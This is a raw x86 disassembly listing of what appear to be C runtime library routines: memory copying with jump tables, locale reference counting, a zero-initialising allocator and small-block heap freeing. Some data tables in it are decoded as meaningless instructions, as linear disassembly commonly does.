  426091:	mov    ebp,esp
  426093:	push   edi
  426094:	push   esi
  426095:	mov    esi,DWORD PTR [ebp+0xc]
  426098:	mov    ecx,DWORD PTR [ebp+0x10]
  42609b:	mov    edi,DWORD PTR [ebp+0x8]
  42609e:	mov    eax,ecx
  4260a0:	mov    edx,ecx
  4260a2:	add    eax,esi
  4260a4:	cmp    edi,esi
  4260a6:	jbe    0x4260b0
  4260a8:	cmp    edi,eax
  4260aa:	jb     0x42622c
  4260b0:	test   edi,0x3
  4260b6:	jne    0x4260cc
  4260b8:	shr    ecx,0x2
  4260bb:	and    edx,0x3
  4260be:	cmp    ecx,0x8
  4260c1:	jb     0x4260ec
  4260c3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260c5:	jmp    DWORD PTR [edx*4+0x4261dc]
  4260cc:	mov    eax,edi
  4260ce:	mov    edx,0x3
  4260d3:	sub    ecx,0x4
  4260d6:	jb     0x4260e4
  4260d8:	and    eax,0x3
  4260db:	add    ecx,eax
  4260dd:	jmp    DWORD PTR [eax*4+0x4260f0]
  4260e4:	jmp    DWORD PTR [ecx*4+0x4261ec]
  4260eb:	nop
  4260ec:	jmp    DWORD PTR [ecx*4+0x426170]
  4260f3:	nop
  4260f4:	add    BYTE PTR [ecx+0x42],ah
  4260f7:	add    BYTE PTR [ecx+eiz*2],ch
  4260fa:	inc    edx
  4260fb:	add    BYTE PTR [eax+0x61],dl
  4260fe:	inc    edx
  4260ff:	add    BYTE PTR [ebx],ah
  426101:	ror    DWORD PTR [edx-0x75f877fa],1
  426107:	inc    esi
  426108:	add    DWORD PTR [eax+0x468a0147],ecx
  42610e:	add    al,cl
  426110:	jmp    0x289e917
  426115:	add    esi,0x3
  426118:	add    edi,0x3
  42611b:	cmp    ecx,0x8
  42611e:	jb     0x4260ec
  426120:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426122:	jmp    DWORD PTR [edx*4+0x4261dc]
  426129:	lea    ecx,[ecx+0x0]
  42612c:	and    edx,ecx
  42612e:	mov    al,BYTE PTR [esi]
  426130:	mov    BYTE PTR [edi],al
  426132:	mov    al,BYTE PTR [esi+0x1]
  426135:	shr    ecx,0x2
  426138:	mov    BYTE PTR [edi+0x1],al
  42613b:	add    esi,0x2
  42613e:	add    edi,0x2
  426141:	cmp    ecx,0x8
  426144:	jb     0x4260ec
  426146:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426148:	jmp    DWORD PTR [edx*4+0x4261dc]
  42614f:	nop
  426150:	and    edx,ecx
  426152:	mov    al,BYTE PTR [esi]
  426154:	mov    BYTE PTR [edi],al
  426156:	add    esi,0x1
  426159:	shr    ecx,0x2
  42615c:	add    edi,0x1
  42615f:	cmp    ecx,0x8
  426162:	jb     0x4260ec
  426164:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426166:	jmp    DWORD PTR [edx*4+0x4261dc]
  42616d:	lea    ecx,[ecx+0x0]
  426170:	shl    DWORD PTR [ecx+0x42],cl
  426173:	add    al,al
  426175:	popa   
  426176:	inc    edx
  426177:	add    BYTE PTR [eax-0x4fffbd9f],bh
  42617d:	popa   
  42617e:	inc    edx
  42617f:	add    BYTE PTR [eax-0x5fffbd9f],ch
  426185:	popa   
  426186:	inc    edx
  426187:	add    BYTE PTR [eax-0x6fffbd9f],bl
  42618d:	popa   
  42618e:	inc    edx
  42618f:	add    BYTE PTR [ebx-0x761b71bc],cl
  426195:	inc    esp
  426196:	(bad)  
  426197:	in     al,0x8b
  426199:	inc    esp
  42619a:	mov    gs,eax
  42619c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4261a0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4261a4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4261a8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4261ac:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4261b0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4261b4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4261b8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4261bc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4261c0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4261c4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4261c8:	lea    eax,[ecx*4+0x0]
  4261cf:	add    esi,eax
  4261d1:	add    edi,eax
  4261d3:	jmp    DWORD PTR [edx*4+0x4261dc]
  4261da:	mov    edi,edi
  4261dc:	in     al,dx
  4261dd:	popa   
  4261de:	inc    edx
  4261df:	add    ah,dh
  4261e1:	popa   
  4261e2:	inc    edx
  4261e3:	add    BYTE PTR [eax],al
  4261e5:	bound  eax,QWORD PTR [edx+0x0]
  4261e8:	adc    al,0x62
  4261ea:	inc    edx
  4261eb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4261f1:	leave  
  4261f2:	ret    
  4261f3:	nop
  4261f4:	mov    al,BYTE PTR [esi]
  4261f6:	mov    BYTE PTR [edi],al
  4261f8:	mov    eax,DWORD PTR [ebp+0x8]
  4261fb:	pop    esi
  4261fc:	pop    edi
  4261fd:	leave  
  4261fe:	ret    
  4261ff:	nop
  426200:	mov    al,BYTE PTR [esi]
  426202:	mov    BYTE PTR [edi],al
  426204:	mov    al,BYTE PTR [esi+0x1]
  426207:	mov    BYTE PTR [edi+0x1],al
  42620a:	mov    eax,DWORD PTR [ebp+0x8]
  42620d:	pop    esi
  42620e:	pop    edi
  42620f:	leave  
  426210:	ret    
  426211:	lea    ecx,[ecx+0x0]
  426214:	mov    al,BYTE PTR [esi]
  426216:	mov    BYTE PTR [edi],al
  426218:	mov    al,BYTE PTR [esi+0x1]
  42621b:	mov    BYTE PTR [edi+0x1],al
  42621e:	mov    al,BYTE PTR [esi+0x2]
  426221:	mov    BYTE PTR [edi+0x2],al
  426224:	mov    eax,DWORD PTR [ebp+0x8]
  426227:	pop    esi
  426228:	pop    edi
  426229:	leave  
  42622a:	ret    
  42622b:	nop
  42622c:	lea    esi,[ecx+esi*1-0x4]
  426230:	lea    edi,[ecx+edi*1-0x4]
  426234:	test   edi,0x3
  42623a:	jne    0x426260
  42623c:	shr    ecx,0x2
  42623f:	and    edx,0x3
  426242:	cmp    ecx,0x8
  426245:	jb     0x426254
  426247:	std    
  426248:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42624a:	cld    
  42624b:	jmp    DWORD PTR [edx*4+0x426378]
  426252:	mov    edi,edi
  426254:	neg    ecx
  426256:	jmp    DWORD PTR [ecx*4+0x426328]
  42625d:	lea    ecx,[ecx+0x0]
  426260:	mov    eax,edi
  426262:	mov    edx,0x3
  426267:	cmp    ecx,0x4
  42626a:	jb     0x426278
  42626c:	and    eax,0x3
  42626f:	sub    ecx,eax
  426271:	jmp    DWORD PTR [eax*4+0x42627c]
  426278:	jmp    DWORD PTR [ecx*4+0x426378]
  42627f:	nop
  426280:	mov    WORD PTR [edx+0x42],fs
  426283:	add    BYTE PTR [eax-0x27ffbd9e],dh
  426289:	bound  eax,QWORD PTR [edx+0x0]
  42628c:	mov    al,BYTE PTR [esi+0x3]
  42628f:	and    edx,ecx
  426291:	mov    BYTE PTR [edi+0x3],al
  426294:	sub    esi,0x1
  426297:	shr    ecx,0x2
  42629a:	sub    edi,0x1
  42629d:	cmp    ecx,0x8
  4262a0:	jb     0x426254
  4262a2:	std    
  4262a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262a5:	cld    
  4262a6:	jmp    DWORD PTR [edx*4+0x426378]
  4262ad:	lea    ecx,[ecx+0x0]
  4262b0:	mov    al,BYTE PTR [esi+0x3]
  4262b3:	and    edx,ecx
  4262b5:	mov    BYTE PTR [edi+0x3],al
  4262b8:	mov    al,BYTE PTR [esi+0x2]
  4262bb:	shr    ecx,0x2
  4262be:	mov    BYTE PTR [edi+0x2],al
  4262c1:	sub    esi,0x2
  4262c4:	sub    edi,0x2
  4262c7:	cmp    ecx,0x8
  4262ca:	jb     0x426254
  4262cc:	std    
  4262cd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262cf:	cld    
  4262d0:	jmp    DWORD PTR [edx*4+0x426378]
  4262d7:	nop
  4262d8:	mov    al,BYTE PTR [esi+0x3]
  4262db:	and    edx,ecx
  4262dd:	mov    BYTE PTR [edi+0x3],al
  4262e0:	mov    al,BYTE PTR [esi+0x2]
  4262e3:	mov    BYTE PTR [edi+0x2],al
  4262e6:	mov    al,BYTE PTR [esi+0x1]
  4262e9:	shr    ecx,0x2
  4262ec:	mov    BYTE PTR [edi+0x1],al
  4262ef:	sub    esi,0x3
  4262f2:	sub    edi,0x3
  4262f5:	cmp    ecx,0x8
  4262f8:	jb     0x426254
  4262fe:	std    
  4262ff:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426301:	cld    
  426302:	jmp    DWORD PTR [edx*4+0x426378]
  426309:	lea    ecx,[ecx+0x0]
  42630c:	sub    al,0x63
  42630e:	inc    edx
  42630f:	add    BYTE PTR [ebx+eiz*2],dh
  426312:	inc    edx
  426313:	add    BYTE PTR [ebx+eiz*2],bh
  426316:	inc    edx
  426317:	add    BYTE PTR [ebx+eiz*2+0x42],al
  42631b:	add    BYTE PTR [ebx+eiz*2+0x42],cl
  42631f:	add    BYTE PTR [ebx+eiz*2+0x42],dl
  426323:	add    BYTE PTR [ebx+eiz*2+0x42],bl
  426327:	add    BYTE PTR [edi+0x63],ch
  42632a:	inc    edx
  42632b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426331:	inc    esp
  426332:	(bad)  
  426333:	sbb    al,0x8b
  426335:	inc    esp
  426336:	mov    ds,WORD PTR [eax]
  426338:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42633c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426340:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426344:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426348:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42634c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426350:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426354:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426358:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42635c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426360:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426364:	lea    eax,[ecx*4+0x0]
  42636b:	add    esi,eax
  42636d:	add    edi,eax
  42636f:	jmp    DWORD PTR [edx*4+0x426378]
  426376:	mov    edi,edi
  426378:	mov    BYTE PTR [ebx+0x42],ah
  42637b:	add    BYTE PTR [eax-0x5fffbd9d],dl
  426381:	arpl   WORD PTR [edx+0x0],ax
  426384:	mov    ah,0x63
  426386:	inc    edx
  426387:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42638d:	leave  
  42638e:	ret    
  42638f:	nop
  426390:	mov    al,BYTE PTR [esi+0x3]
  426393:	mov    BYTE PTR [edi+0x3],al
  426396:	mov    eax,DWORD PTR [ebp+0x8]
  426399:	pop    esi
  42639a:	pop    edi
  42639b:	leave  
  42639c:	ret    
  42639d:	lea    ecx,[ecx+0x0]
  4263a0:	mov    al,BYTE PTR [esi+0x3]
  4263a3:	mov    BYTE PTR [edi+0x3],al
  4263a6:	mov    al,BYTE PTR [esi+0x2]
  4263a9:	mov    BYTE PTR [edi+0x2],al
  4263ac:	mov    eax,DWORD PTR [ebp+0x8]
  4263af:	pop    esi
  4263b0:	pop    edi
  4263b1:	leave  
  4263b2:	ret    
  4263b3:	nop
  4263b4:	mov    al,BYTE PTR [esi+0x3]
  4263b7:	mov    BYTE PTR [edi+0x3],al
  4263ba:	mov    al,BYTE PTR [esi+0x2]
  4263bd:	mov    BYTE PTR [edi+0x2],al
  4263c0:	mov    al,BYTE PTR [esi+0x1]
  4263c3:	mov    BYTE PTR [edi+0x1],al
  4263c6:	mov    eax,DWORD PTR [ebp+0x8]
  4263c9:	pop    esi
  4263ca:	pop    edi
  4263cb:	leave  
  4263cc:	ret    
  4263cd:	push   DWORD PTR [esp+0x4]
  4263d1:	call   DWORD PTR ds:0x4290cc
  4263d7:	xor    eax,eax
  4263d9:	inc    eax
  4263da:	ret    0x8
  4263dd:	push   0x10
  4263df:	push   0x4296d0
  4263e4:	call   0x425350
  4263e9:	mov    eax,ds:0x45dd88
  4263ee:	test   eax,eax
  4263f0:	jne    0x426429
  4263f2:	cmp    DWORD PTR ds:0x45dac4,0x1
  4263f9:	je     0x42641f
  4263fb:	push   0x4296bc
  426400:	call   DWORD PTR ds:0x429024
  426406:	test   eax,eax
  426408:	je     0x42641f
  42640a:	push   0x429694
  42640f:	push   eax
  426410:	call   DWORD PTR ds:0x429020
  426416:	mov    ds:0x45dd88,eax
  42641b:	test   eax,eax
  42641d:	jne    0x426429
  42641f:	mov    eax,0x4263cd
  426424:	mov    ds:0x45dd88,eax
  426429:	and    DWORD PTR [ebp-0x4],0x0
  42642d:	push   DWORD PTR [ebp+0xc]
  426430:	push   DWORD PTR [ebp+0x8]
  426433:	call   eax
  426435:	mov    DWORD PTR [ebp-0x1c],eax
  426438:	jmp    0x42645e
  42643a:	mov    eax,DWORD PTR [ebp-0x14]
  42643d:	mov    eax,DWORD PTR [eax]
  42643f:	mov    eax,DWORD PTR [eax]
  426441:	mov    DWORD PTR [ebp-0x20],eax
  426444:	xor    eax,eax
  426446:	inc    eax
  426447:	ret    
  426448:	mov    esp,DWORD PTR [ebp-0x18]
  42644b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  426452:	jne    0x42645c
  426454:	push   0x8
  426456:	call   DWORD PTR ds:0x429098
  42645c:	xor    eax,eax
  42645e:	or     DWORD PTR [ebp-0x4],0xffffffff
  426462:	call   0x42538b
  426467:	ret    
  426468:	push   0x10
  42646a:	push   0x4296e0
  42646f:	call   0x425350
  426474:	mov    esi,DWORD PTR [ebp+0x8]
  426477:	imul   esi,DWORD PTR [ebp+0xc]
  42647b:	mov    DWORD PTR [ebp-0x1c],esi
  42647e:	test   esi,esi
  426480:	jne    0x426483
  426482:	inc    esi
  426483:	xor    edi,edi
  426485:	mov    DWORD PTR [ebp-0x20],edi
  426488:	cmp    esi,0xffffffe0
  42648b:	ja     0x4264f2
  42648d:	cmp    DWORD PTR ds:0x45e144,0x3
  426494:	jne    0x4264dd
  426496:	add    esi,0xf
  426499:	and    esi,0xfffffff0
  42649c:	mov    DWORD PTR [ebp+0xc],esi
  42649f:	mov    ebx,DWORD PTR [ebp-0x1c]
  4264a2:	cmp    ebx,DWORD PTR ds:0x45df04
  4264a8:	ja     0x4264dd
  4264aa:	push   0x4
  4264ac:	call   0x42550f
  4264b1:	pop    ecx
  4264b2:	and    DWORD PTR [ebp-0x4],edi
  4264b5:	push   ebx
  4264b6:	call   0x426f11
  4264bb:	pop    ecx
  4264bc:	mov    DWORD PTR [ebp-0x20],eax
  4264bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4264c3:	call   0x426512
  4264c8:	mov    edi,DWORD PTR [ebp-0x20]
  4264cb:	test   edi,edi
  4264cd:	je     0x4264e1
  4264cf:	push   DWORD PTR [ebp-0x1c]
  4264d2:	push   0x0
  4264d4:	push   edi
  4264d5:	call   0x427c50
  4264da:	add    esp,0xc
  4264dd:	test   edi,edi
  4264df:	jne    0x42651b
  4264e1:	push   esi
  4264e2:	push   0x8
  4264e4:	push   DWORD PTR ds:0x45e140
  4264ea:	call   DWORD PTR ds:0x429030
  4264f0:	mov    edi,eax
  4264f2:	test   edi,edi
  4264f4:	jne    0x42651b
  4264f6:	cmp    DWORD PTR ds:0x45ddc8,edi
  4264fc:	je     0x42651b
  4264fe:	push   esi
  4264ff:	call   0x427c32
  426504:	pop    ecx
  426505:	test   eax,eax
  426507:	jne    0x426483
  42650d:	jmp    0x42651d
  42650f:	mov    esi,DWORD PTR [ebp+0xc]
  426512:	push   0x4
  426514:	call   0x42547b
  426519:	pop    ecx
  42651a:	ret    
  42651b:	mov    eax,edi
  42651d:	call   0x42538b
  426522:	ret    
  426523:	push   esi
  426524:	mov    esi,DWORD PTR [esp+0x8]
  426528:	mov    eax,DWORD PTR [esi+0x3c]
  42652b:	push   edi
  42652c:	xor    edi,edi
  42652e:	cmp    eax,DWORD PTR ds:0x45ddd4
  426534:	je     0x426599
  426536:	cmp    eax,edi
  426538:	je     0x426599
  42653a:	mov    eax,DWORD PTR [esi+0x2c]
  42653d:	cmp    DWORD PTR [eax],edi
  42653f:	jne    0x426599
  426541:	mov    eax,DWORD PTR [esi+0x34]
  426544:	cmp    eax,edi
  426546:	je     0x426564
  426548:	cmp    DWORD PTR [eax],edi
  42654a:	jne    0x426564
  42654c:	cmp    eax,DWORD PTR ds:0x45def0
  426552:	je     0x426564
  426554:	push   eax
  426555:	call   0x425f5a
  42655a:	push   DWORD PTR [esi+0x3c]
  42655d:	call   0x427e9f
  426562:	pop    ecx
  426563:	pop    ecx
  426564:	mov    eax,DWORD PTR [esi+0x30]
  426567:	cmp    eax,edi
  426569:	je     0x426587
  42656b:	cmp    DWORD PTR [eax],edi
  42656d:	jne    0x426587
  42656f:	cmp    eax,DWORD PTR ds:0x45def4
  426575:	je     0x426587
  426577:	push   eax
  426578:	call   0x425f5a
  42657d:	push   DWORD PTR [esi+0x3c]
  426580:	call   0x427e40
  426585:	pop    ecx
  426586:	pop    ecx
  426587:	push   DWORD PTR [esi+0x2c]
  42658a:	call   0x425f5a
  42658f:	push   DWORD PTR [esi+0x3c]
  426592:	call   0x425f5a
  426597:	pop    ecx
  426598:	pop    ecx
  426599:	mov    eax,DWORD PTR [esi+0x40]
  42659c:	cmp    eax,DWORD PTR ds:0x45deec
  4265a2:	je     0x4265bc
  4265a4:	cmp    eax,edi
  4265a6:	je     0x4265bc
  4265a8:	cmp    DWORD PTR [eax],edi
  4265aa:	jne    0x4265bc
  4265ac:	push   eax
  4265ad:	call   0x425f5a
  4265b2:	push   DWORD PTR [esi+0x44]
  4265b5:	call   0x425f5a
  4265ba:	pop    ecx
  4265bb:	pop    ecx
  4265bc:	mov    eax,DWORD PTR [esi+0x50]
  4265bf:	cmp    eax,DWORD PTR ds:0x45ddd0
  4265c5:	je     0x4265e3
  4265c7:	cmp    eax,edi
  4265c9:	je     0x4265e3
  4265cb:	cmp    DWORD PTR [eax+0xb4],edi
  4265d1:	jne    0x4265e3
  4265d3:	push   eax
  4265d4:	call   0x427cb0
  4265d9:	push   DWORD PTR [esi+0x50]
  4265dc:	call   0x425f5a
  4265e1:	pop    ecx
  4265e2:	pop    ecx
  4265e3:	push   esi
  4265e4:	call   0x425f5a
  4265e9:	pop    ecx
  4265ea:	pop    edi
  4265eb:	pop    esi
  4265ec:	ret    
  4265ed:	push   esi
  4265ee:	call   0x425203
  4265f3:	mov    esi,eax
  4265f5:	mov    eax,DWORD PTR [esi+0x64]
  4265f8:	cmp    eax,DWORD PTR ds:0x45d58c
  4265fe:	je     0x4266aa
  426604:	test   eax,eax
  426606:	je     0x426637
  426608:	mov    ecx,DWORD PTR [eax+0x2c]
  42660b:	dec    DWORD PTR [eax]
  42660d:	test   ecx,ecx
  42660f:	je     0x426613
  426611:	dec    DWORD PTR [ecx]
  426613:	mov    ecx,DWORD PTR [eax+0x34]
  426616:	test   ecx,ecx
  426618:	je     0x42661c
  42661a:	dec    DWORD PTR [ecx]
  42661c:	mov    ecx,DWORD PTR [eax+0x30]
  42661f:	test   ecx,ecx
  426621:	je     0x426625
  426623:	dec    DWORD PTR [ecx]
  426625:	mov    ecx,DWORD PTR [eax+0x40]
  426628:	test   ecx,ecx
  42662a:	je     0x42662e
  42662c:	dec    DWORD PTR [ecx]
  42662e:	mov    ecx,DWORD PTR [eax+0x4c]
  426631:	dec    DWORD PTR [ecx+0xb4]
  426637:	mov    ecx,DWORD PTR ds:0x45d58c
  42663d:	mov    DWORD PTR [esi+0x64],ecx
  426640:	mov    ecx,DWORD PTR ds:0x45d58c
  426646:	inc    DWORD PTR [ecx]
  426648:	mov    ecx,DWORD PTR ds:0x45d58c
  42664e:	mov    ecx,DWORD PTR [ecx+0x2c]
  426651:	test   ecx,ecx
  426653:	je     0x426657
  426655:	inc    DWORD PTR [ecx]
  426657:	mov    ecx,DWORD PTR ds:0x45d58c
  42665d:	mov    ecx,DWORD PTR [ecx+0x34]
  426660:	test   ecx,ecx
  426662:	je     0x426666
  426664:	inc    DWORD PTR [ecx]
  426666:	mov    ecx,DWORD PTR ds:0x45d58c
  42666c:	mov    ecx,DWORD PTR [ecx+0x30]
  42666f:	test   ecx,ecx
  426671:	je     0x426675
  426673:	inc    DWORD PTR [ecx]
  426675:	mov    ecx,DWORD PTR ds:0x45d58c
  42667b:	mov    ecx,DWORD PTR [ecx+0x40]
  42667e:	test   ecx,ecx
  426680:	je     0x426684
  426682:	inc    DWORD PTR [ecx]
  426684:	mov    ecx,DWORD PTR ds:0x45d58c
  42668a:	mov    ecx,DWORD PTR [ecx+0x4c]
  42668d:	inc    DWORD PTR [ecx+0xb4]
  426693:	test   eax,eax
  426695:	je     0x4266aa
  426697:	cmp    DWORD PTR [eax],0x0
  42669a:	jne    0x4266aa
  42669c:	cmp    eax,0x45d538
  4266a1:	je     0x4266aa
  4266a3:	push   eax
  4266a4:	call   0x426523
  4266a9:	pop    ecx
  4266aa:	mov    eax,DWORD PTR [esi+0x64]
  4266ad:	pop    esi
  4266ae:	ret    
  4266af:	push   0xc
  4266b1:	push   0x429870
  4266b6:	call   0x425350
  4266bb:	push   0xc
  4266bd:	call   0x42550f
  4266c2:	pop    ecx
  4266c3:	and    DWORD PTR [ebp-0x4],0x0
  4266c7:	call   0x4265ed
  4266cc:	mov    DWORD PTR [ebp-0x1c],eax
  4266cf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4266d3:	call   0x4266e1
  4266d8:	mov    eax,DWORD PTR [ebp-0x1c]
  4266db:	call   0x42538b
  4266e0:	ret    
  4266e1:	push   0xc
  4266e3:	call   0x42547b
  4266e8:	pop    ecx
  4266e9:	ret    
  4266ea:	push   0x140
  4266ef:	push   0x0
  4266f1:	push   DWORD PTR ds:0x45e140
  4266f7:	call   DWORD PTR ds:0x429030
  4266fd:	test   eax,eax
  4266ff:	mov    ds:0x45df00,eax
  426704:	jne    0x426707
  426706:	ret    
  426707:	mov    ecx,DWORD PTR [esp+0x4]
  42670b:	and    DWORD PTR ds:0x45def8,0x0
  426712:	and    DWORD PTR ds:0x45defc,0x0
  426719:	mov    ds:0x45df08,eax
  42671e:	xor    eax,eax
  426720:	mov    DWORD PTR ds:0x45df04,ecx
  426726:	mov    DWORD PTR ds:0x45df0c,0x10
  426730:	inc    eax
  426731:	ret    
  426732:	mov    eax,ds:0x45defc
  426737:	lea    ecx,[eax+eax*4]
  42673a:	mov    eax,ds:0x45df00
  42673f:	lea    ecx,[eax+ecx*4]
  426742:	jmp    0x426756
  426744:	mov    edx,DWORD PTR [esp+0x4]
  426748:	sub    edx,DWORD PTR [eax+0xc]
  42674b:	cmp    edx,0x100000
  426751:	jb     0x42675c
  426753:	add    eax,0x14
  426756:	cmp    eax,ecx
  426758:	jb     0x426744
  42675a:	xor    eax,eax
  42675c:	ret    
  42675d:	push   ebp
  42675e:	mov    ebp,esp
  426760:	sub    esp,0x10
  426763:	mov    ecx,DWORD PTR [ebp+0x8]
  426766:	mov    eax,DWORD PTR [ecx+0x10]
  426769:	push   esi
  42676a:	mov    esi,DWORD PTR [ebp+0xc]
  42676d:	push   edi
  42676e:	mov    edi,esi
  426770:	sub    edi,DWORD PTR [ecx+0xc]
  426773:	add    esi,0xfffffffc
  426776:	shr    edi,0xf
  426779:	mov    ecx,edi
  42677b:	imul   ecx,ecx,0x204
  426781:	lea    ecx,[ecx+eax*1+0x144]
  426788:	mov    DWORD PTR [ebp-0x10],ecx
  42678b:	mov    ecx,DWORD PTR [esi]
  42678d:	dec    ecx
  42678e:	test   cl,0x1
  426791:	mov    DWORD PTR [ebp-0x4],ecx
  426794:	jne    0x426a71
  42679a:	push   ebx
  42679b:	lea    ebx,[ecx+esi*1]
  42679e:	mov    edx,DWORD PTR [ebx]
  4267a0:	mov    DWORD PTR [ebp-0xc],edx
  4267a3:	mov    edx,DWORD PTR [esi-0x4]
  4267a6:	mov    DWORD PTR [ebp-0x8],edx
  4267a9:	mov    edx,DWORD PTR [ebp-0xc]
  4267ac:	test   dl,0x1
  4267af:	mov    DWORD PTR [ebp+0xc],ebx
  4267b2:	jne    0x426828
  4267b4:	sar    edx,0x4
  4267b7:	dec    edx
  4267b8:	cmp    edx,0x3f
  4267bb:	jbe    0x4267c0
  4267bd:	push   0x3f
  4267bf:	pop    edx
  4267c0:	mov    ecx,DWORD PTR [ebx+0x4]
  4267c3:	cmp    ecx,DWORD PTR [ebx+0x8]
  4267c6:	jne    0x42680a
  4267c8:	cmp    edx,0x20
  4267cb:	mov    ebx,0x80000000
  4267d0:	jae    0x4267eb
  4267d2:	mov    ecx,edx
  4267d4:	shr    ebx,cl
  4267d6:	lea    ecx,[edx+eax*1+0x4]
  4267da:	not    ebx
  4267dc:	and    DWORD PTR [eax+edi*4+0x44],ebx
  4267e0:	dec    BYTE PTR [ecx]
  4267e2:	jne    0x426807
  4267e4:	mov    ecx,DWORD PTR [ebp+0x8]
  4267e7:	and    DWORD PTR [ecx],ebx
  4267e9:	jmp    0x426807
  4267eb:	lea    ecx,[edx-0x20]
  4267ee:	shr    ebx,cl
  4267f0:	lea    ecx,[edx+eax*1+0x4]
  4267f4:	not    ebx
  4267f6:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  4267fd:	dec    BYTE PTR [ecx]
  4267ff:	jne    0x426807
  426801:	mov    ecx,DWORD PTR [ebp+0x8]
  426804:	and    DWORD PTR [ecx+0x4],ebx
  426807:	mov    ebx,DWORD PTR [ebp+0xc]
  42680a:	mov    edx,DWORD PTR [ebx+0x8]
  42680d:	mov    ebx,DWORD PTR [ebx+0x4]
  426810:	mov    ecx,DWORD PTR [ebp-0x4]
  426813:	add    ecx,DWORD PTR [ebp-0xc]
  426816:	mov    DWORD PTR [edx+0x4],ebx
  426819:	mov    edx,DWORD PTR [ebp+0xc]
  42681c:	mov    ebx,DWORD PTR [edx+0x4]
  42681f:	mov    edx,DWORD PTR [edx+0x8]
  426822:	mov    DWORD PTR [ebx+0x8],edx
  426825:	mov    DWORD PTR [ebp-0x4],ecx
  426828:	mov    edx,ecx
  42682a:	sar    edx,0x4
  42682d:	dec    edx
  42682e:	cmp    edx,0x3f
  426831:	jbe    0x426836
  426833:	push   0x3f
  426835:	pop    edx
  426836:	mov    ebx,DWORD PTR [ebp-0x8]
  426839:	and    ebx,0x1
  42683c:	mov    DWORD PTR [ebp-0xc],ebx
  42683f:	jne    0x4268d4
  426845:	sub    esi,DWORD PTR [ebp-0x8]
  426848:	mov    ebx,DWORD PTR [ebp-0x8]
  42684b:	sar    ebx,0x4
  42684e:	push   0x3f
  426850:	mov    DWORD PTR [ebp+0xc],esi
  426853:	dec    ebx
  426854:	pop    esi
  426855:	cmp    ebx,esi
  426857:	jbe    0x42685b
  426859:	mov    ebx,esi
  42685b:	add    ecx,DWORD PTR [ebp-0x8]
  42685e:	mov    edx,ecx
  426860:	sar    edx,0x4
  426863:	dec    edx
  426864:	cmp    edx,esi
  426866:	mov    DWORD PTR [ebp-0x4],ecx
  426869:	jbe    0x42686d
  42686b:	mov    edx,esi
  42686d:	cmp    ebx,edx
  42686f:	je     0x4268cf
  426871:	mov    ecx,DWORD PTR [ebp+0xc]
  426874:	mov    esi,DWORD PTR [ecx+0x4]
  426877:	cmp    esi,DWORD PTR [ecx+0x8]
  42687a:	jne    0x4268b7
  42687c:	cmp    ebx,0x20
  42687f:	mov    esi,0x80000000
  426884:	jae    0x42689d
  426886:	mov    ecx,ebx
  426888:	shr    esi,cl
  42688a:	not    esi
  42688c:	and    DWORD PTR [eax+edi*4+0x44],esi
  426890:	dec    BYTE PTR [ebx+eax*1+0x4]
  426894:	jne    0x4268b7
  426896:	mov    ecx,DWORD PTR [ebp+0x8]
  426899:	and    DWORD PTR [ecx],esi
  42689b:	jmp    0x4268b7
  42689d:	lea    ecx,[ebx-0x20]
  4268a0:	shr    esi,cl
  4268a2:	not    esi
  4268a4:	and    DWORD PTR [eax+edi*4+0xc4],esi
  4268ab:	dec    BYTE PTR [ebx+eax*1+0x4]
  4268af:	jne    0x4268b7
  4268b1:	mov    ecx,DWORD PTR [ebp+0x8]
  4268b4:	and    DWORD PTR [ecx+0x4],esi
  4268b7:	mov    ecx,DWORD PTR [ebp+0xc]
  4268ba:	mov    esi,DWORD PTR [ecx+0x8]
  4268bd:	mov    ecx,DWORD PTR [ecx+0x4]
  4268c0:	mov    DWORD PTR [esi+0x4],ecx
  4268c3:	mov    ecx,DWORD PTR [ebp+0xc]
  4268c6:	mov    esi,DWORD PTR [ecx+0x4]
  4268c9:	mov    ecx,DWORD PTR [ecx+0x8]
  4268cc:	mov    DWORD PTR [esi+0x8],ecx
  4268cf:	mov    esi,DWORD PTR [ebp+0xc]
  4268d2:	jmp    0x4268d7
  4268d4:	mov    ebx,DWORD PTR [ebp+0x8]
  4268d7:	cmp    DWORD PTR [ebp-0xc],0x0
  4268db:	jne    0x4268e5
  4268dd:	cmp    ebx,edx
  4268df:	je     0x426965
  4268e5:	mov    ecx,DWORD PTR [ebp-0x10]
  4268e8:	lea    ecx,[ecx+edx*8]
  4268eb:	mov    ebx,DWORD PTR [ecx+0x4]
  4268ee:	mov    DWORD PTR [esi+0x8],ecx
  4268f1:	mov    DWORD PTR [esi+0x4],ebx
